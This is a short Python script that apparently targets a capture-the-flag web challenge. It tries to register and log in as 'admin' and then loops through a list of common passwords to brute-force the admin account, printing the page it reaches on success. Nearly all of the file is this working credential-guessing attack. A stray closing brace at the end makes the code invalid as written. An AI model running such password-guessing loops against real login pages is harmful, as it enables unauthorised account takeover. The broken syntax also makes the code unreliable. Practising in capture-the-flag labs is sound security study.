import requests, base64, zlib, json

base = 'https://web-random-cheese.tracebash.xyz'

# Try to decode current session cookie
# The cookie format has 3 parts: base64(header).base64(payload).signature
# header is typically: {"typ":"Cookie","exp":timestamp}

# Let's try to register with username 'admin' and see if we get special access
s = requests.Session()
r = s.post(f'{base}/register', data={'username': 'admin', 'password': 'admin123'}, allow_redirects=False)
print('Register admin:', r.status_code, r.headers.get('Location'))

# Maybe admin already exists?
r = s.post(f'{base}/login', data={'username': 'admin', 'password': 'admin123'}, allow_redirects=False)
print('Login admin:', r.status_code)

# Try common passwords for admin
for pw in ['admin', 'password', 'admin123', 'root', 'tom', 'jerry', 'cheese', 'lucky', 'draw', 'flag', '123456']:
    s = requests.Session()
    r = s.post(f'{base}/login', data={'username': 'admin', 'password': pw}, allow_redirects= False)
    if r.status_code == 302:
        print(f'Found admin password: {pw}')
        r2 = s.get(f'{base}/')
        print(r2.text[:2000].encode('ascii', errors='replace').decode('ascii'))
        break
}